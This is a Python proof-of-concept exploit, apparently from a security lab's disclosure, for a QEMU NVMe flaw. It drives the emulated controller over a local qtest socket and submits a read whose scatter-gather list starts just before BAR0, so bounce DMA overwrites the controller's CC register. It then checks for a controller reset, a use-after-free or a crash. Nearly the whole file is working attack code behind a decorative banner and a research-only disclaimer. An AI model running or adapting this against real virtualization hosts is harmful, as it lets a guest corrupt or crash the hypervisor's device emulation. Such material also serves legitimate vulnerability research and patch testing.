#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: qemu-nvme-sgl-bar (High: 8.2)
#  Vendor: QEMU (qemu.org)
#  Versions: QEMU v11.1.2 (4fc49f46)
#  Impact: guest NVMe SGL starts before BAR0 and bounce-DMA writes CC; controller reset of live NvmeRequest
#  Requires: loopback qtest 127.0.0.1:18720; nvme device
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "qemu-nvme-sgl-bar"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove QEMU NVMe SGL DMA can start outside BAR0 and write into CC."""

import socket
import struct
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "qemu-nvme-sgl-bar"
WITNESS = "QEMU-NVME-SGL-BAR-WITNESS"
HOST = "127.0.0.1"
PORT = 18720
WORK_DIR = Path(__file__).resolve().parent / "work"
QEMU_LOG = WORK_DIR / "qemu.log"
QEMU_ERR = WORK_DIR / "qemu.stderr"

PCI_CONFIG_ADDR = 0xCF8
PCI_CONFIG_DATA = 0xCFC
PCI_COMMAND = 0x04
PCI_COMMAND_IO = 0x1
PCI_COMMAND_MEMORY = 0x2
PCI_COMMAND_MASTER = 0x4
PCI_BAR0 = 0x10
PCI_BAR1 = 0x14
PCI_VENDOR_REDHAT = 0x1B36
PCI_DEVICE_NVME = 0x0010
PCI_SLOT = 4
PCI_FN = 0

NVME_REG_CAP = 0x00
NVME_REG_CC = 0x14
NVME_REG_CSTS = 0x1C
NVME_REG_AQA = 0x24
NVME_REG_ASQ = 0x28
NVME_REG_ACQ = 0x30
NVME_DB_BASE = 0x1000

NVME_ADM_CREATE_SQ = 0x01
NVME_ADM_CREATE_CQ = 0x05
NVME_ADM_IDENTIFY = 0x06
NVME_CMD_READ = 0x02
NVME_PSDT_SGL_MPTR_CONTIGUOUS = 0x01
NVME_ID_CNS_CTRL = 0x01
NVME_DATA_TRAS_ERROR = 0x0004
NVME_DNR = 0x4000
NVME_CQ_PC = 0x1
NVME_SQ_PC = 0x1
NVME_SQES = 6
NVME_CQES = 4

ADMIN_SQ_SIZE = 8
ADMIN_CQ_SIZE = 8
IO_QSIZE = 8
PAGE = 0x1000
ASQ_GPA = 0x20000
ACQ_GPA = 0x21000
IOCQ_GPA = 0x22000
IOSQ_GPA = 0x23000
IDENT_GPA = 0x24000
BAR_BASE = 0xE0000000
SGL_LEN = 4096
LBA_SIZE = 512
SGL_LEAD = 0x14  # start this many bytes before BAR0 so CC sits in the span
CONNECT_TRIES = 60
READY_TRIES = 80
CQE_TRIES = 200


@dataclass
class Cqe:
    result: int
    dw1: int
    sq_head: int
    sq_id: int
    cid: int
    status_raw: int

    @property
    def phase(self) -> int:
        return self.status_raw & 0x1

    @property
    def sc(self) -> int:
        return self.status_raw >> 1


class QTest:
    def __init__(self, host: str, port: int, timeout_s: float = 8.0) -> None:
        self.host = host
        self.port = port
        self.timeout_s = timeout_s
        self.sock = socket.create_connection((host, port), timeout=timeout_s)
        self.sock.settimeout(timeout_s)
        self._buf = b""

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def _recv_line(self) -> str:
        while b"\n" not in self._buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("qtest socket closed")
            self._buf += chunk
        line, self._buf = self._buf.split(b"\n", 1)
        return line.decode("ascii", "replace").strip()

    def cmd(self, line: str) -> str:
        self.sock.sendall((line + "\n").encode("ascii"))
        while True:
            resp = self._recv_line()
            if not resp or resp.startswith("#") or resp.startswith("IRQ "):
                continue
            return resp

    def expect_ok(self, line: str) -> str:
        resp = self.cmd(line)
        if not resp.startswith("OK"):
            raise RuntimeError(f"qtest {line!r} -> {resp!r}")
        return resp

    def pump(self) -> None:
        try:
            self.expect_ok("clock_step 1000000")
        except (ConnectionError, TimeoutError, OSError, RuntimeError):
            raise

    def outl(self, addr: int, value: int) -> None:
        self.expect_ok(f"outl 0x{addr:x} 0x{value:x}")

    def inl(self, addr: int) -> int:
        resp = self.expect_ok(f"inl 0x{addr:x}")
        parts = resp.split()
        return int(parts[1], 16)

    def readl(self, addr: int) -> int:
        resp = self.expect_ok(f"readl 0x{addr:x}")
        parts = resp.split()
        return int(parts[1], 16)

    def writel(self, addr: int, value: int) -> None:
        self.expect_ok(f"writel 0x{addr:x} 0x{value:x}")

    def writeq(self, addr: int, value: int) -> None:
        self.expect_ok(f"writeq 0x{addr:x} 0x{value:x}")

    def memset(self, addr: int, size: int, pattern: int) -> None:
        self.expect_ok(f"memset 0x{addr:x} 0x{size:x} 0x{pattern:02x}")

    def memwrite(self, addr: int, data: bytes) -> None:
        self.expect_ok(f"write 0x{addr:x} 0x{len(data):x} 0x{data.hex()}")

    def memread(self, addr: int, size: int) -> bytes:
        resp = self.expect_ok(f"read 0x{addr:x} 0x{size:x}")
        parts = resp.split()
        hexdata = parts[1]
        if hexdata.startswith("0x"):
            hexdata = hexdata[2:]
        raw = bytes.fromhex(hexdata)
        if len(raw) != size:
            raise RuntimeError(f"memread size {len(raw)} != {size}")
        return raw


class NvmeQtest:
    def __init__(self, qtest: QTest) -> None:
        self.qt = qtest
        self.devfn = (PCI_SLOT << 3) | PCI_FN
        self.bar0 = 0
        self.bar_size = 0
        self.admin_sq_tail = 0
        self.admin_cq_head = 0
        self.admin_cq_phase = 1
        self.io_sq_tail = 0
        self.io_cq_head = 0
        self.io_cq_phase = 1
        self.cid = 1

    def _cfg_addr(self, offset: int) -> int:
        return 0x80000000 | (self.devfn << 8) | (offset & 0xFC)

    def cfg_readl(self, offset: int) -> int:
        self.qt.outl(PCI_CONFIG_ADDR, self._cfg_addr(offset))
        return self.qt.inl(PCI_CONFIG_DATA)

    def cfg_writel(self, offset: int, value: int) -> None:
        self.qt.outl(PCI_CONFIG_ADDR, self._cfg_addr(offset))
        self.qt.outl(PCI_CONFIG_DATA, value)

    def cfg_readw(self, offset: int) -> int:
        val = self.cfg_readl(offset & ~3)
        shift = (offset & 3) * 8
        return (val >> shift) & 0xFFFF

    def cfg_writew(self, offset: int, value: int) -> None:
        aligned = offset & ~3
        cur = self.cfg_readl(aligned)
        shift = (offset & 3) * 8
        mask = 0xFFFF << shift
        self.cfg_writel(aligned, (cur & ~mask) | ((value & 0xFFFF) << shift))

    def next_cid(self) -> int:
        cid = self.cid
        self.cid = (self.cid + 1) & 0xFFFF
        if self.cid == 0:
            self.cid = 1
        return cid

    def enable_device(self) -> None:
        vendor = self.cfg_readw(0)
        device = self.cfg_readw(2)
        log(f"pci slot={PCI_SLOT} vendor=0x{vendor:04x} device=0x{device:04x}")
        if vendor != PCI_VENDOR_REDHAT or device != PCI_DEVICE_NVME:
            raise RuntimeError(
                f"nvme-not-at-04.0 vendor=0x{vendor:04x} device=0x{device:04x}"
            )
        self.cfg_writel(PCI_BAR0, 0xFFFFFFFF)
        raw = self.cfg_readl(PCI_BAR0)
        masked = raw & ~0xF
        if masked == 0:
            raise RuntimeError(f"bar0-size-zero raw=0x{raw:x}")
        self.bar_size = masked & -masked
        self.bar0 = BAR_BASE
        self.cfg_writel(PCI_BAR0, self.bar0)
        self.cfg_writel(PCI_BAR1, 0)
        cmd = self.cfg_readw(PCI_COMMAND)
        self.cfg_writew(
            PCI_COMMAND,
            cmd | PCI_COMMAND_IO | PCI_COMMAND_MEMORY | PCI_COMMAND_MASTER,
        )
        log(f"bar0=0x{self.bar0:x} size=0x{self.bar_size:x}")

    def mmio_readl(self, off: int) -> int:
        return self.qt.readl(self.bar0 + off)

    def mmio_writel(self, off: int, value: int) -> None:
        self.qt.writel(self.bar0 + off, value)

    def mmio_writeq(self, off: int, value: int) -> None:
        self.qt.writeq(self.bar0 + off, value)

    def wait_csts_rdy(self, want: int) -> None:
        for _ in range(READY_TRIES):
            self.qt.pump()
            csts = self.mmio_readl(NVME_REG_CSTS)
            if (csts & 1) == want:
                return
        raise RuntimeError(f"csts-rdy-timeout want={want} csts=0x{csts:x}")

    def start_controller(self) -> None:
        self.mmio_writel(NVME_REG_CC, 0)
        self.wait_csts_rdy(0)
        cap = self.mmio_readl(NVME_REG_CAP) | (
            self.mmio_readl(NVME_REG_CAP + 4) << 32
        )
        log(f"cap=0x{cap:x} mqes={cap & 0xFFFF}")
        self.qt.memset(ASQ_GPA, PAGE, 0)
        self.qt.memset(ACQ_GPA, PAGE, 0)
        self.qt.memset(IOCQ_GPA, PAGE, 0)
        self.qt.memset(IOSQ_GPA, PAGE, 0)
        aqa = ((ADMIN_CQ_SIZE - 1) << 16) | (ADMIN_SQ_SIZE - 1)
        self.mmio_writel(NVME_REG_AQA, aqa)
        self.mmio_writeq(NVME_REG_ASQ, ASQ_GPA)
        self.mmio_writeq(NVME_REG_ACQ, ACQ_GPA)
        cc = 1 | (NVME_SQES << 16) | (NVME_CQES << 20)
        self.mmio_writel(NVME_REG_CC, cc)
        self.wait_csts_rdy(1)
        log(f"cc=0x{self.mmio_readl(NVME_REG_CC):x} csts=0x{self.mmio_readl(NVME_REG_CSTS):x}")

    def _sqe(self, opcode: int, cid: int, nsid: int = 0, flags: int = 0) -> bytearray:
        cmd = bytearray(64)
        cmd[0] = opcode & 0xFF
        cmd[1] = flags & 0xFF
        struct.pack_into("<H", cmd, 2, cid)
        struct.pack_into("<I", cmd, 4, nsid)
        return cmd

    def _submit_admin(self, cmd: bytes) -> None:
        addr = ASQ_GPA + self.admin_sq_tail * 64
        self.qt.memwrite(addr, cmd)
        self.admin_sq_tail = (self.admin_sq_tail + 1) % ADMIN_SQ_SIZE
        self.mmio_writel(NVME_DB_BASE, self.admin_sq_tail)

    def _submit_io(self, cmd: bytes) -> None:
        addr = IOSQ_GPA + self.io_sq_tail * 64
        self.qt.memwrite(addr, cmd)
        self.io_sq_tail = (self.io_sq_tail + 1) % IO_QSIZE
        self.mmio_writel(NVME_DB_BASE + 2 * 4, self.io_sq_tail)

    def _read_cqe(self, gpa: int, head: int) -> Cqe:
        raw = self.qt.memread(gpa + head * 16, 16)
        result, dw1, sq_head, sq_id, cid, status = struct.unpack_from("<IIHHHH", raw)
        return Cqe(result, dw1, sq_head, sq_id, cid, status)

    def wait_admin_cqe(self, cid: int) -> Cqe:
        for _ in range(CQE_TRIES):
            self.qt.pump()
            cqe = self._read_cqe(ACQ_GPA, self.admin_cq_head)
            if cqe.phase == self.admin_cq_phase:
                self.admin_cq_head = (self.admin_cq_head + 1) % ADMIN_CQ_SIZE
                if self.admin_cq_head == 0:
                    self.admin_cq_phase ^= 1
                self.mmio_writel(NVME_DB_BASE + 4, self.admin_cq_head)
                if cqe.cid != cid:
                    raise RuntimeError(f"admin-cid-mismatch got={cqe.cid} want={cid}")
                return cqe
        raise RuntimeError("admin-cqe-timeout")

    def wait_io_cqe(self, cid: int) -> Cqe:
        for _ in range(CQE_TRIES):
            self.qt.pump()
            cqe = self._read_cqe(IOCQ_GPA, self.io_cq_head)
            if cqe.phase == self.io_cq_phase:
                self.io_cq_head = (self.io_cq_head + 1) % IO_QSIZE
                if self.io_cq_head == 0:
                    self.io_cq_phase ^= 1
                self.mmio_writel(NVME_DB_BASE + 3 * 4, self.io_cq_head)
                if cqe.cid != cid:
                    raise RuntimeError(f"io-cid-mismatch got={cqe.cid} want={cid}")
                return cqe
        raise RuntimeError("io-cqe-timeout")

    def identify_ctrl(self) -> bytes:
        cid = self.next_cid()
        cmd = self._sqe(NVME_ADM_IDENTIFY, cid, nsid=0)
        struct.pack_into("<Q", cmd, 24, IDENT_GPA)
        struct.pack_into("<I", cmd, 40, NVME_ID_CNS_CTRL)
        self.qt.memset(IDENT_GPA, 4096, 0)
        self._submit_admin(bytes(cmd))
        cqe = self.wait_admin_cqe(cid)
        if cqe.sc != 0:
            raise RuntimeError(f"identify-sc=0x{cqe.sc:x}")
        return self.qt.memread(IDENT_GPA, 4096)

    def create_io_queues(self) -> None:
        cid = self.next_cid()
        cmd = self._sqe(NVME_ADM_CREATE_CQ, cid)
        struct.pack_into("<Q", cmd, 24, IOCQ_GPA)
        struct.pack_into("<I", cmd, 40, ((IO_QSIZE - 1) << 16) | 1)
        struct.pack_into("<I", cmd, 44, NVME_CQ_PC)
        self._submit_admin(bytes(cmd))
        cqe = self.wait_admin_cqe(cid)
        if cqe.sc != 0:
            raise RuntimeError(f"create-cq-sc=0x{cqe.sc:x}")

        cid = self.next_cid()
        cmd = self._sqe(NVME_ADM_CREATE_SQ, cid)
        struct.pack_into("<Q", cmd, 24, IOSQ_GPA)
        struct.pack_into("<I", cmd, 40, ((IO_QSIZE - 1) << 16) | 1)
        struct.pack_into("<I", cmd, 44, (1 << 16) | NVME_SQ_PC)
        self._submit_admin(bytes(cmd))
        cqe = self.wait_admin_cqe(cid)
        if cqe.sc != 0:
            raise RuntimeError(f"create-sq-sc=0x{cqe.sc:x}")
        log("io-queues created")

    def submit_read_sgl(self, addr: int, length: int) -> int:
        if length % LBA_SIZE:
            raise RuntimeError(f"sgl-len-unaligned len={length}")
        nlb = length // LBA_SIZE
        cid = self.next_cid()
        flags = NVME_PSDT_SGL_MPTR_CONTIGUOUS << 6
        cmd = self._sqe(NVME_CMD_READ, cid, nsid=1, flags=flags)
        struct.pack_into("<Q", cmd, 24, addr)
        struct.pack_into("<I", cmd, 32, length)
        cmd[39] = 0x00  # SGL data block, address subtype
        struct.pack_into("<Q", cmd, 40, 0)  # slba
        struct.pack_into("<H", cmd, 48, nlb - 1)
        self._submit_io(bytes(cmd))
        return cid


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def read_text(path: Path) -> str:
    if not path.is_file():
        return ""
    return path.read_text(encoding="utf-8", errors="replace")


def asan_text() -> str:
    chunks: list[str] = []
    if not WORK_DIR.is_dir():
        return ""
    for path in sorted(WORK_DIR.glob("asan.*")):
        chunks.append(read_text(path))
    return "\n".join(chunks)


def connect_qtest() -> QTest:
    last: Exception | None = None
    for attempt in range(1, CONNECT_TRIES + 1):
        try:
            qt = QTest(HOST, PORT)
            resp = qt.expect_ok("endianness")
            log(f"qtest-ready attempt={attempt} {resp}")
            return qt
        except (OSError, TimeoutError, ConnectionError, RuntimeError) as exc:
            last = exc
            log(f"qtest-wait attempt={attempt} err={type(exc).__name__}:{exc}")
            time.sleep(1)
    raise RuntimeError(f"qtest-connect-failed {last}")


def main() -> int:
    WORK_DIR.mkdir(parents=True, exist_ok=True)
    qt: QTest | None = None
    try:
        qt = connect_qtest()
        nvme = NvmeQtest(qt)
        nvme.enable_device()
        nvme.start_controller()
        ident = nvme.identify_ctrl()
        ieee = ident[73:76]
        log(f"identify ieee={ieee.hex()}")
        if ieee != bytes([0x00, 0x54, 0x52]):
            return fail(f"identify-ieee-mismatch {ieee.hex()}")
        nvme.create_io_queues()

        csts_before_ctrl = nvme.mmio_readl(NVME_REG_CSTS)
        log(f"control-sgl start=bar0=0x{nvme.bar0:x} len={SGL_LEN}")
        cid = nvme.submit_read_sgl(nvme.bar0, SGL_LEN)
        try:
            cqe = nvme.wait_io_cqe(cid)
            control_sc = cqe.sc
        except RuntimeError as exc:
            return fail(f"control-cqe {exc}")
        csts_after_ctrl = nvme.mmio_readl(NVME_REG_CSTS)
        log(
            f"control-sc=0x{control_sc:x} csts-before=0x{csts_before_ctrl:x} "
            f"csts-after=0x{csts_after_ctrl:x}"
        )
        if (control_sc & 0x7FF) != NVME_DATA_TRAS_ERROR:
            return fail(f"control-not-rejected sc=0x{control_sc:x}")
        if (csts_after_ctrl & 1) != 1:
            return fail("control-cleared-rdy")

        sgl_addr = nvme.bar0 - SGL_LEAD
        sgl_end = sgl_addr + SGL_LEN
        log(
            f"span-sgl start=0x{sgl_addr:x} end=0x{sgl_end:x} "
            f"bar0=0x{nvme.bar0:x}-0x{nvme.bar0 + nvme.bar_size:x}"
        )
        if not (sgl_addr < nvme.bar0 < sgl_end):
            return fail("span-range-invalid")

        cc_before = nvme.mmio_readl(NVME_REG_CC)
        csts_before = nvme.mmio_readl(NVME_REG_CSTS)
        span_cqe_sc: int | None = None
        qemu_died = False
        try:
            cid = nvme.submit_read_sgl(sgl_addr, SGL_LEN)
            try:
                cqe = nvme.wait_io_cqe(cid)
                span_cqe_sc = cqe.sc
                log(f"span-cqe-sc=0x{span_cqe_sc:x}")
            except RuntimeError as exc:
                log(f"span-cqe-absent {exc}")
            for _ in range(20):
                qt.pump()
        except (ConnectionError, TimeoutError, OSError, RuntimeError) as exc:
            qemu_died = True
            log(f"span-qtest-closed {type(exc).__name__}:{exc}")

        cc_after = None
        csts_after = None
        if not qemu_died:
            try:
                cc_after = nvme.mmio_readl(NVME_REG_CC)
                csts_after = nvme.mmio_readl(NVME_REG_CSTS)
            except (ConnectionError, TimeoutError, OSError, RuntimeError) as exc:
                qemu_died = True
                log(f"post-span-read-closed {type(exc).__name__}:{exc}")

        logs = read_text(QEMU_LOG) + "\n" + read_text(QEMU_ERR) + "\n" + asan_text()
        span_hex = f"{sgl_addr:x}"
        map_hit = f"addr 0x{span_hex}" in logs.lower() or f"addr 0x{sgl_addr:x}" in logs
        mmio_stopped = "pci_nvme_mmio_stopped" in logs
        asan_hit = "ERROR: AddressSanitizer" in logs or "heap-use-after-free" in logs
        rdy_cleared = csts_after is not None and (csts_after & 1) == 0
        cc_cleared = cc_after is not None and (cc_after & 1) == 0 and (cc_before & 1) == 1
        rejected = span_cqe_sc is not None and (span_cqe_sc & 0x7FF) == NVME_DATA_TRAS_ERROR

        log(
            f"span-map-log={int(map_hit)} mmio-stopped={int(mmio_stopped)} "
            f"asan={int(asan_hit)} qemu-died={int(qemu_died)} "
            f"cc-before=0x{cc_before:x} cc-after={cc_after if cc_after is None else hex(cc_after)} "
            f"csts-before=0x{csts_before:x} "
            f"csts-after={csts_after if csts_after is None else hex(csts_after)}"
        )

        if rejected and not rdy_cleared and not mmio_stopped and not asan_hit:
            return fail(f"span-rejected sc=0x{span_cqe_sc:x}")

        mmio_hit = rdy_cleared or cc_cleared or mmio_stopped or asan_hit
        accepted = (not rejected) or mmio_hit
        if not accepted:
            return fail("span-sgl-not-accepted")
        if not mmio_hit:
            return fail("span-no-mmio-hit")

        log(
            f"SUCCESS {LABEL} control-sc=0x{control_sc:x} "
            f"span-addr=0x{sgl_addr:x} span-end=0x{sgl_end:x} "
            f"csts-rdy-before={csts_before & 1} "
            f"csts-rdy-after={0 if rdy_cleared or qemu_died else (csts_after or 0) & 1} "
            f"mmio-stopped={int(mmio_stopped)} asan={int(asan_hit)} "
            f"{WITNESS}"
        )
        return 0
    except (OSError, TimeoutError, ConnectionError, RuntimeError, ValueError, struct.error) as exc:
        logs = read_text(QEMU_LOG) + "\n" + read_text(QEMU_ERR) + "\n" + asan_text()
        if "pci_nvme_mmio_stopped" in logs or "ERROR: AddressSanitizer" in logs:
            log(f"late-log-hit {type(exc).__name__}:{exc}")
            log(f"SUCCESS {LABEL} via-log {type(exc).__name__} {WITNESS}")
            return 0
        return fail(f"{type(exc).__name__}:{exc}")
    finally:
        if qt is not None:
            qt.close()


if __name__ == "__main__":
    raise SystemExit(main())

